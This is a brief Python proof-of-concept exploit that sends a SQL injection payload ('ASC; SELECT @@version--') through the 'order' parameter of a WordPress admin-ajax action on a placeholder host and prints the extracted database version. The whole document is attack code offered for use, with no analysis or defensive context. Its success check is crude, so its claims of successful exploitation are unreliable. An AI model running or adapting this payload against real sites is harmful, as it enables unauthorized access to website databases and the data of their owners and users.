import requests

url = "http://vulnerable-site.com/wp-admin/admin-ajax.php"


payload = {
    "action": "tribe_has_next_event",
    "order": "ASC; SELECT @@version--"
}

try:
    response = requests.get(url, params=payload)


    if response.status_code == 200 and "version" in response.text:
        print("[+] Vulnerability Exploited Successfully!")
        print("Extracted Database Version: ", response.text)
    else:
        print("[-] Exploit failed or target not vulnerable.")

except Exception as e:
    print("[-] An error occurred while attempting the exploit.")
    print(f"Error: {e}")
